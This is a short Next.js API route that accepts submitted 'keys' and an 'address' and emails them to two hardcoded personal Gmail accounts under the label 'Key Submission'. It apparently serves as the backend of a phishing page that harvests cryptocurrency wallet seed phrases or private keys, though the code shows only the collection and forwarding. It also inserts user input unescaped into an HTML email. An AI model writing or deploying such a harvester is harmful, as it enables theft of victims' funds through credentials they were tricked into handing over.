import { NextRequest, NextResponse } from "next/server"
import nodemailer from "nodemailer"

const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
    }
})

export async function POST(req: NextRequest) {
    const { keys , address} = await req.json()

    if (!keys) return NextResponse.json({ error: "Missing fields", status: 400 }, { status: 400 })


    try {
        await transporter.sendMail({
            from: `"The Sector: Key Submission" <${process.env.EMAIL_USER}>`,
            to: ["bitfusion867@gmail.com", "kenthomson999@gmail.com"],
            subject: `Key or ${address}`,
            text: `New keys submision review: ${keys} `,
            html: `
    <!DOCTYPE html>
    <html>
        <head>
          <meta charset="utf-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>KEYS</title>
        </head>
        <body>
            <div>Keywords: ${keys}</div>
            <div>Address:${address}</div>
        </body>
    </html>
            `
        })
    return NextResponse.json({ success: true })
    } catch (error) {
      console.error("Email error:", error)
      return NextResponse.json({ error: "Failed to send" }, { status: 500 })
    }
}